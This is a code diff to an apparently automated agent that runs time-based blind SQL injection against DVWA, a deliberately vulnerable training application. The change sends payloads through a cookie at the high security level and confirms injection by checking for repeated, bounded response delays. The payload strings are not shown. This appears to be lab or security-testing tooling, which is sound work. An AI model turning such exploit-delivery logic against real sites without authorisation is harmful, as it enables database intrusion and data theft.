@@ -5,19 +5,21 @@ from __future__ import annotations
 import logging
 import time
 from typing import Any
+from urllib.parse import quote
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
 from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.payload_library import PayloadLibrary
+from foundation.payload_validator import bounded_sleep_delays
 from foundation.session_manager import DVWASession
+from foundation.verifier import usable_blind_response
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "sqli_time_blind"
 MODULE_PATH = "/vulnerabilities/sqli_blind/"
-SESSION_INPUT_PATH = "/vulnerabilities/sqli/session-input.php"
-HIGH_RESULT_PATH = "/vulnerabilities/sqli/"
+HIGH_RESULT_PATH = MODULE_PATH
 _PROBE_OBSERVATION_KEY = "response_delay_measurable"
 
 TIME_THRESHOLD_MEDIUM = 1.8  # seconds — medium DVWA timing has lower jitter margin
@@ -25,10 +27,10 @@ TIME_THRESHOLD_HIGH = 2.5  # seconds — retain the strict high-level threshold
 TIME_THRESHOLD = TIME_THRESHOLD_HIGH  # Backward-compatible high-level alias
 
 
-def _request_high_via_session(session: DVWASession, payload: str):
-    """Store a high-level payload, then reload the page that renders results."""
-    session.post(SESSION_INPUT_PATH, data={"id": payload})
-    return session.get(HIGH_RESULT_PATH)
+def _request_high_via_cookie(session: DVWASession, payload: str):
+    """DVWA's high blind module reads id from a cookie, not the SQLi session."""
+    session.http.set_cookie("id", quote(payload, safe=""))
+    return session.get(MODULE_PATH)
 
 
 def _request(session: DVWASession, security_level: str, payload: str):
@@ -37,7 +39,7 @@ def _request(session: DVWASession, security_level: str, payload: str):
     if security_level == "medium":
         return session.post(MODULE_PATH, data=request_data)
     if security_level == "high":
-        return _request_high_via_session(session, payload)
+        return _request_high_via_cookie(session, payload)
     return session.get(MODULE_PATH, params=request_data)
 
 
@@ -55,8 +57,9 @@ def _get_baseline_timing(
     for _ in range(samples):
         try:
             start = time.monotonic()
-            _request(session, security_level, "1")
-            times.append(time.monotonic() - start)
+            response = _request(session, security_level, "1")
+            if response.status_code == 200:
+                times.append(time.monotonic() - start)
         except Exception:
             continue
     if not times:
@@ -103,14 +106,14 @@ def _probe_preconditions(
                 AGENT_ID,
                 payload,
                 resp.status_code,
-                True,
-                endpoint=MODULE_PATH,
+                usable_blind_response(resp, allow_missing=True),
+                endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
                 elapsed_ms=elapsed_ms,
                 baseline_elapsed_ms=baseline_ms,
                 delay_ms=elapsed_ms - baseline_ms,
             ))
             # Check if response time significantly exceeds baseline
-            if elapsed - baseline_elapsed > threshold:
+            if usable_blind_response(resp, allow_missing=True) and elapsed - baseline_elapsed > threshold:
                 observations[_PROBE_OBSERVATION_KEY] = True
                 return True, tried, observations, events
         except Exception as exc:
@@ -135,41 +138,60 @@ def _attempt_exploit(
     events: list[dict] = []
     confirmed: list[str] = []
     score = 0
-    delay_confirms = 0
     threshold = TIME_THRESHOLD_MEDIUM if security_level == "medium" else TIME_THRESHOLD_HIGH
-    required_delays = 1 if security_level == "medium" else 2
 
     # Baseline timing (extracted helper)
     baseline_elapsed = _get_baseline_timing(session, security_level=security_level)
+    if baseline_elapsed <= 0:
+        return score, tried, confirmed, events
 
     for payload in payloads:
         if payload in already_tried:
             continue
         tried.append(payload)
         try:
+            bounded_delay = sum(bounded_sleep_delays(payload))
             start = time.monotonic()
             resp = _request(session, security_level, payload)
             elapsed = time.monotonic() - start
             baseline_ms = baseline_elapsed * 1000
             elapsed_ms = elapsed * 1000
+            delay = elapsed - baseline_elapsed
+            valid_delay = usable_blind_response(resp, allow_missing=True) and threshold < delay <= bounded_delay + threshold
             events.append(exploit_event(
                 AGENT_ID,
                 payload,
                 resp.status_code,
-                True,
-                endpoint=MODULE_PATH,
+                valid_delay,
+                endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
                 elapsed_ms=elapsed_ms,
                 baseline_elapsed_ms=baseline_ms,
                 delay_ms=elapsed_ms - baseline_ms,
             ))
-            # Medium's single-seed evidence is sufficient after a measurable
-            # delay; high retains two independent confirmations.
-            if elapsed - baseline_elapsed > threshold:
-                delay_confirms += 1
-                if delay_confirms >= required_delays:
-                    score = max(score, 3)
-                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
-                    break
+            if valid_delay:
+                # A second transaction with the same validated candidate rules
+                # out a single slow response, including medium's single seed.
+                control = _get_baseline_timing(session, security_level=security_level)
+                if control <= 0:
+                    continue
+                start = time.monotonic()
+                repeated = _request(session, security_level, payload)
+                repeated_elapsed = time.monotonic() - start
+                repeat_ok = usable_blind_response(repeated, allow_missing=True) and threshold < repeated_elapsed - control <= bounded_delay + threshold
+                events.append(exploit_event(
+                    AGENT_ID, payload, repeated.status_code, repeat_ok,
+                    endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
+                    elapsed_ms=repeated_elapsed * 1000,
+                    baseline_elapsed_ms=control * 1000,
+                    delay_ms=(repeated_elapsed - control) * 1000,
+                ))
+                if not repeat_ok:
+                    continue
+                # Two bounded transactions of this candidate, each compared
+                # with successful harmless controls, establish repeatability.
+                score = 3
+                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
+                break
         except Exception as exc:
             logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
             events.append(exploit_event(AGENT_ID, payload, None, False))
